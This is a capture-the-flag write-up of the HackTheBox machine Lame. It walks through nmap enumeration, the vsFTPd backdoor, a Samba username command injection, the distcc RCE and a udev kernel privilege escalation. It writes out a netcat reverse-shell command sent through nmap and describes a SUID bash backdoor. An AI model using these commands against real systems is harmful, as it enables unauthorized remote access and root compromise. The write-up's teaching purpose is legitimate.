---
title: HackTheBox - Lame Writeup w/o Metasploit
date: 2020-08-01 19:03:06
tags: [hackthebox, walkthrough, smb, oscp-like]
---

# HackTheBox - Lame Writeup w/o Metasploit

## Introduction

Lame was the first machine on the HackTheBox platform, it is very much like any other Boot2Root machine but is good for beginners. Lame is a Linux machine and has rightfully rated as Easy by the platform. There are 2 ways to own the machine and a false positive which may or may not lead to a rabbit hole, depending on the way you approach it. 
<p>
    <img src="/HackTheBox/htb-lame/lame.png" style="max-width: 50%;" />
    <figcaption>Box Details</figcaption>
</p>

This post is structured in the way I tackled this machine instead of grouping every part and dumping it. Let's jump in.

## Reconnaissance

Before starting with any machine, I always create a directory and some sub directories as follows to help maintain structure:

![Making Directories](/HackTheBox/htb-lame/mkdir.png)

I usually create an "exploit" sub-directory too, but I forgot this time.

I will start by doing recon of the machine, and will begin with a few nmap scans as always.

### General Enumeration

Starting with an initial nmap scan, to get the top 1000 ports.

```
nmap -Pn -n -oN nmap/initial 10.10.10.3
```

![Initial Nmap Scan](/HackTheBox/htb-lame/nmap_initial.png)

We can see that from the top 1000 ports, few are open:

1. Port 21 - FTP
2. Port 22 - SSH
3. Port 139 - SMB
4. Port 445 - SMB

Let's make some notes!

Since port 22 is open, it is most likely a Linux machine. Port 21 and 139, 445 are both some type of file sharing protocols, so maybe we might be working with some internal files or could leverage this to upload our malicious files.

Let's get more information before we speculate any further. Running an all ports scan in the background while we poke around these few ports ourselves.

```
nmap -Pn -n -p- -oN nmap/allports 10.10.10.3
```

### FTP Enumeration

While the scan is running, let's take a look at the FTP banner.

![FTP Banner](/HackTheBox/htb-lame/ftp_enum.png)

We use telnet to grab the banner, FTP version running is - *vsFTPd 2.3.4*

### SSH Enumeration

Now that we have FTPs' banner, lets get SSHs' banner.

![SSH Banner](/HackTheBox/htb-lame/ssh_enum.png)

Great, we have the SSH version with us. Good thing about getting SSH version is you get the OS running on the target machine too. We search the exact SSH version on Google and get the following result from one of the pages:

![OS Discovery](/HackTheBox/htb-lame/ssh_enum2.png)

The term "hardy-security" catches my eye, let's look a little further. Let's search for "Ubuntu hardy".

![OS Found](/HackTheBox/htb-lame/ssh_enum3.png)

And we found the OS that is running - Ubuntu Hardy 8.04 LTS, a very old OS.

### SMB Enumeration

Now that SSHs' enumeration is done, let's move on to SMBs' enumeration.

![SMB Shares Listing](/HackTheBox/htb-lame/smb_enum1.png)

Looks like we have read and write access to one of the shares - */tmp*. Though when we try to connect, it errors out.

![SMB Protocol Error](/HackTheBox/htb-lame/smb_enum2.png)

Turns out *smbclient* has made it harder to work with insecure versions of the protocol, one way to get around this without messing up the configuration file is by stating the protocols accepted in the command itself.

Command sent:

``` 
smbclient -N //10.10.10.3/tmp --option='client min protocol=NT1'
```

![SMB Share Connected](/HackTheBox/htb-lame/smb_enum3.png)

Nothing looks interesting. Let's go and check if the all ports scan has finished yet or not. Also since we know that this machine is ancient, we will also run a Nmap vulnerability scan as it's very likely to be vulnerable by multiple issues.

### General Enumeration Contd.

Let's check the all ports scan we had started.

![Nmap All Ports Scan](/HackTheBox/htb-lame/nmap_allports.png)

The scan has been finished and turns out we have one more service running on this machine - *distccd*

Let's run a targeted scan on all the ports found using default scripts and version scanning.

![Nmap Targeted Scan](/HackTheBox/htb-lame/nmap_tgt.png)

We didn't really find anything new, let's move on to the vulnerability scan.

Command sent:
```
nmap -Pn -n -p21,22,139,445,3632 --script vuln -sV -oN nmap/vuln_scan 10.10.10.3
```

Output:

![Nmap Vuln Scan](/HackTheBox/htb-lame/nmap_vuln.png)

Out of all the output, this was the most interesting one. Looks like we have RCE through the distcc service.

## Exploit Lookup

We already know that we have an RCE on hand, but nonetheless let's perform further enumeration on all the services, especially to find any known public exploits for each service, if available.

### FTP

Let's look for any public exploits available for vsFTPd 2.3.4

![Searchsploit Results](/HackTheBox/htb-lame/ftpvuln.png)

Looks like there's one exploit for the exact version number, and it is also a RCE which is great.

### SSH

Upon searching for publicly known exploits for the OpenSSH service, there weren't any found. So we'll cross out SSH from out list of things to look for, unless we get some creds or keys from somewhere.

### SMB

Let's look for any public exploits available for SMB 3.0.20

![Searchsploit Results](/HackTheBox/htb-lame/smbvuln.png)

If you look up exploits for "smb", you won't find much, so ensure to look up the exploits for "samba".
From the list of exploits, only the second exploit fits our need. We can say this with confidence due to few reasons:

1. The version fits in
2. The exploit is a Command Execution
3. If you look over to the exploit path, you see that this is a remote exploit. Thus we have another RCE on hand.
4. The first exploit just looks like some bypass
5. The last exploit is a Denial of Service, which we certainly want to avoid at all costs.

## Initial Foothold

Let's test out each exploit we found sequentially, we will analyse the MSF modules and then exploit the services manually.

### Exploiting vsFTPd RCE

Let's go through the MSF module on exploit-db.

![Evil USER Smiley](/HackTheBox/htb-lame/ftpmsf1.png)

By going through the exploit, it turns out that this version of the vsFTP contained a backdoor when released to the public. It can be invoked by sending a ":)" in the USER parameter.

![Random PASS](/HackTheBox/htb-lame/ftpmsf2.png)

Password can be anything, it is irrelevant. Knowing an actual user in the service is not required.

![Bind Shell Port](/HackTheBox/htb-lame/ftpmsf3.png)

By sending those credentials, the backdoor opens a bind shell on port 6200.

![Payload](/HackTheBox/htb-lame/ftpmsf4.png)

Once the backdoor is detected by checking if the port 6200 is open or not, Metasploit sends a payload to connect to it.

Looks simple enough to test and exploit it manually, so let's do that.

![Payload Sent](/HackTheBox/htb-lame/ftpexploit1.png)

Payload is sent, now let's try connect to the port 6200 of the target to see if it's open and do we get connected to it or not.

![Connection Failed](/HackTheBox/htb-lame/ftpexploit2.png)

Unfortunately the port cannot be reached, and our connection times out. We will no longer focus on this service.

### Exploiting Samba RCE

A tip, when you want to view a exploit that `searchsploit` printed out in the results, you can use `-x` flag of searchsploit to view its' contents.

```
searchsploit -x unix/remote/16320.rb
```

Upon checking the MSF module, it is just connecting to the service normally, except the username part.

![Payload](/HackTheBox/htb-lame/smbmsf.png)

All we have to do is send a reverse shell command in the username parameter and catch the shell. Let's test it.

Sending the payload in the username field:

![Payload Sent](/HackTheBox/htb-lame/smbexploit1.png)

Ensuring my listener is on to catch it:

![Catching Shell](/HackTheBox/htb-lame/smbexploit2.png)

I do get a shell, but it turns out to be my own machine. Another way to login is by using `logon` command in the smb prompt.

![Payload Sent](/HackTheBox/htb-lame/smbexploit3.png)

Ensuring my listener is on to catch the shell:

![Catching Shell](/HackTheBox/htb-lame/smbexploit4.png)

And it looks like we are already root. 

### Exploiting Distcc RCE

Before we go any further, let's take a look at what distcc itself is.

According to [Gentoo wiki](https://wiki.gentoo.org/wiki/Distcc), "Distcc is a program designed to distribute compiling tasks across a network to participating hosts. It is comprised of a server, distccd, and a client program, distcc."

We know that Nmap automatically tested this vulnerability out for us by sending the UID of the user the program is running under, but how do we change that? By using nmap script args.

If we check which script Nmap ran, it shows that "distcc-cve2004-2687", let's check it online to find it on one of the Nmap script pages.

By searching that exact term, we find the [Nmap script page](https://nmap.org/nsedoc/scripts/distcc-cve2004-2687.html):

![Nmap Script Page](/HackTheBox/htb-lame/distcc0.png)

Not only does it tells us the command to be used but also provides us with an example. If you take a closer look, you'll realise that there's a minor disparity in the name of the script in the example and the one that Nmap actually used. So accordingly, we'll have to send an argument parameter as well.

Let's test it again, but we'll send some other commands to ensure that the vulnerability actually exists and that this service is exploitable.

![Distcc Exploit Test](/HackTheBox/htb-lame/distcc1.png)

The hostname and the IP address of the target is exactly what was expected and so we can conclude that this service is indeed exploitable.

Command sent:
```
nmap -Pn -n -p3632 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='nc 10.10.14.4 443 -e /bin/bash'" 10.10.10.3
```

We ensure our listener is active.

![Catching a Shell](/HackTheBox/htb-lame/distcc2.png)

And we got a low privileged shell on our hand. If you wanted to do this in a better way, you could send a cmd argument of `which nc` in the Nmap distcc script to check if nc is actually on the target machine or not before asking it send you a reverse shell. If it wasn't present and we did not test, it would have caused you some headache as to why it was not returning shell and what are you doing wrong.

## Privilege Escalation

Let's check the home directories.

![User.txt Readable](/HackTheBox/htb-lame/preuser.png)

There's only one users home directory present, and user.txt is readable. We'll get it once we're root.

Next step is to check for odd directories in the root, `/`, directory. Nothing there.
Next is to check for odd crons, again nothing.

Since this machine is old, a kernel exploit is very likely. Let's check the kernel version running, and details of the OS too.

![OS Enumeration](/HackTheBox/htb-lame/priv1.png)

The OS info that we gathered from the SSH version was right.

Let's look for kernel exploits using searchsploit.

![Exploit List](/HackTheBox/htb-lame/priv2.png)

We won't take any exploit with "x86" or "x86_64" mentioned in it as from the `uname -a` command we know that the architecture the target is running is "i686". That helps in reducing the list.

The last three exploits ruled out.
The fourth exploit will be at the last of our list if not completely ruled out since upon inspection the "supported targets" author mentioned were all 64-bit which our target is not.

We have two UDEV exploits, I'll only try the C file, and a sock_sendpage() exploit. Let's test both the exploits one by one.

The first exploit - sock_sendpage(), did not work as intended. Moving to the UDEV C exploit.

We transfer the exploit and compile it. Since there were no instructions, the exploit will be compiled as is.

![Exploit Transferred And Compiled](/HackTheBox/htb-lame/priv3.png)

The exploit has a usage section, which is great.

![Exploit Usage](/HackTheBox/htb-lame/privusage.png)

We need UDEVs' PID to execute this binary on, and it will execute any file named "run" in the tmp directory. Let's get the PID first.

![PID Found](/HackTheBox/htb-lame/priv4.png)

We found the PID in both ways, which happens to be *2687*. Now let's put a malicious file, */tmp/run*, before executing this exploit.

I was having a hard time creating the file in the target so I created it on my attacking machine.

![Malicious File Contents](/HackTheBox/htb-lame/priv5.png)

If it's not obvious, this file is a bash script that will copy the /bin/bash binary to /tmp/backdoor and turn its SUID and GUID bits on by changing the permissions to 6755. Since this operation will be carried out by *root* itself, a *chown* operation is not required.

We'll transfer this malicious script to the target machine in the tmp directory and make it executable.

![Malicious File Ready](/HackTheBox/htb-lame/priv6.png)

Now that the malicious file is ready, we'll execute the exploit binary

![Exploit Executed](/HackTheBox/htb-lame/priv7.png)

Upon execution we check the contents of /tmp and we see that our "backdoor" is ready. To leverage this, we'll have to make use of a special flag in bash which ensures the EUID (Effective User ID) is maintained and those privileges aren't dropped upon execution.

![Got Root](/HackTheBox/htb-lame/root.png)

Upon executing `./backdoor -p` which is now a bash SUID, it maintained the roots privileges and opened a new shell as root.
We could have achieved the same using *dash* in which we wouldn't have had to provide any additional flag and still would have gotten the root shell.

There are easier way of doing things, for example, we could have just made a file with a nc reverse shell command in it and open a new listener and catch the shell that way. But this is much nicer way of doing it in my opinion, I like to open as less amount of connections as possible.

Let's go get our loot.

![Got Root.txt](/HackTheBox/htb-lame/gotroot.png)

## Lessons Learned

1. It's essential to perform a detailed enumeration process to be able to find and leverage the entire attack surface at your disposal.
    1. Perform complete scan of the target
    2. Perform manual enumeration while scans are running in the background to understand more about the machine
    3. Use the newly gathered information to perform even more targeted enumeration
2. Efficiently ruling out exploits from searchsploit output
3. Patch and update your system and services regularly. Disable services that are not required, and/or employ firewall to restrict access to internal services.

